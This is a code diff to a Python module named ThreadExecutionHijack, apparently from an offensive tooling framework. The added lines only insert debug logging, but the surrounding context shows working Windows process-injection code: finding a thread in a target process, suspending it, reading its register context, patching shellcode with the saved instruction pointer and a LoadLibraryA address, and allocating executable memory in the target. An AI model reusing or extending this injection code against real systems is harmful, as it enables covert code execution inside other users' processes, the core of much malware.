@@ -218,6 +218,8 @@ class ThreadExecutionHijack(cypy.Module):
 			cypy.printe("Could not create snapshot")
 			return
 
+		cypy.printv(f"Snapshot: {snapshot}")
+
 		thread = THREADENTRY32()
 		thread.dwSize = ctypes.sizeof(THREADENTRY32)
 		if not ctypes.windll.kernel32.Thread32First(snapshot, ctypes.byref(thread)):
@@ -225,6 +227,7 @@ class ThreadExecutionHijack(cypy.Module):
 			return
 
 		while True:
+			cypy.printv(f"Trying thread {thread.th32ThreadID}")
 			if thread.th32OwnerProcessID == win32process.GetProcessId(proc):
 				break
 
@@ -240,6 +243,8 @@ class ThreadExecutionHijack(cypy.Module):
 		# Suspend thread
 		win32process.SuspendThread(thread)
 
+		cypy.printv("Thread suspended")
+
 		if is64:
 			ctx = CONTEXT64()
 		else:
@@ -247,6 +252,8 @@ class ThreadExecutionHijack(cypy.Module):
 
 		ctx.ContextFlags = CONTEXT_FULL
 		ctypes.windll.kernel32.GetThreadContext(int(thread), ctypes.byref(ctx))
+
+		cypy.printv("Got thread context")
 
 		buffer = SHELLCODE
 		loadlibrarya = win32api.GetProcAddress(
@@ -290,6 +297,8 @@ class ThreadExecutionHijack(cypy.Module):
 			if eip != -1:
 				# push eip
 				buffer = buffer[:eip+1] + ctx.Eip.to_bytes(4, "little") + buffer[eip+5:]
+		
+		cypy.printv("Generated shellcode")
 
 		mem = win32process.VirtualAllocEx(
 			proc, 0, len(buffer), win32con.MEM_COMMIT, win32con.PAGE_EXECUTE_READWRITE)
